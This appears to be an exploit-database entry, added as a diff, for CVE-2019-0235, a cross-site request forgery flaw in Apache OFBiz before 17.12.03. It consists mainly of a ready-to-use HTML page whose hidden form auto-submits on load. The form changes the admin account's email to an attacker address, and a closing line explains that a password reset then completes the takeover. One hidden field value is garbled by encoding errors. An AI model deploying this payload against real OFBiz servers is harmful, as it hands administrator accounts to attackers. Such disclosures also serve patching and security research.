@@ -1,0 +1,29 @@
+# Exploit Title: Apache OFBiz 17.12.03 - Cross-Site Request Forgery (Account Takeover)
+# Exploit Author: Faiz Ahmed Zaidi
+# Vendor Homepage: [https://ofbiz.apache.org/security.html]
+# Software Link: https://ofbiz.apache.org/download.html#security
+# Version: Before 17.12.03
+# Tested on: Linux and Windows
+# CVE : CVE-2019-0235
+
+#Exploit Code:
+
+<html>
+  <body>
+    <form action="https://hostipaddress:8443/partymgr/control/updateEmailAddress" method="POST">
+      <input type="hidden" name="contactMechId" value="admin" />
+      <input type="hidden" name="contactMechTypeId" value="EMAIL&#95;ADDRESS" />
+      <input type="hidden" name="partyId" value="admin" />
+      <input type="hidden" name="DONE&#95;PAGE" value="viewprofile&#63;party&#95;id&#61;adminâ&#136;&#130;yId&#61;admin" />
+      <input type="hidden" name="emailAddress" value="attackeremail@id.com" />
+      <input type="hidden" name="allowSolicitation" value="Y" />
+      <input type="submit" value="Submit request" />
+    </form>
+	<script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+
+After that do a password reset via forget password.
+It's done :)
